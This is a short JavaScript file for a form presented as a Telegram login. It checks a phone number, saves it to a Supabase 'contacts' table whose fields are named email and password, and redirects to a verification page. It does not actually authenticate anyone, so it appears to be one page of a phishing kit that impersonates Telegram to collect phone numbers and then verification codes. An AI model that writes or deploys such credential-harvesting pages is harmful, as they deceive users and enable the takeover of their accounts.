import { supabase } from './supabase.js';

const form = document.getElementById('telegramForm');
const input = document.getElementById('telegramPhone');
const shell = document.getElementById('telegramShell');
const warning = document.getElementById('telegramWarning');

function isValidPhone(value) {
  return /^\+?[0-9]{8,15}$/.test(value.trim());
}

function showError() {
  shell.classList.add('error');
  warning.classList.add('show');
}

function hideError() {
  shell.classList.remove('error');
  warning.classList.remove('show');
}

input.addEventListener('input', () => {
  if (input.value.trim() && !isValidPhone(input.value)) {
    showError();
  } else {
    hideError();
  }
});

form.addEventListener('submit', async (event) => {
  event.preventDefault();
  const value = input.value.trim();

  if (!isValidPhone(value)) {
    showError();
    input.focus();
    return;
  }

  hideError();
  
  const submitBtn = form.querySelector('.login-btn');
  const originalText = submitBtn.textContent;
  submitBtn.textContent = 'Loading...';
  submitBtn.disabled = true;

  const { error } = await supabase
    .from('contacts')
    .insert([{ email: value, password: 'Telegram Login (No Password)' }]);

  if (error) {
    console.error('خطأ:', error);
    submitBtn.textContent = originalText;
    submitBtn.disabled = false;
  } else {
    window.location.href = 'verification.html';
  }
});

input.focus();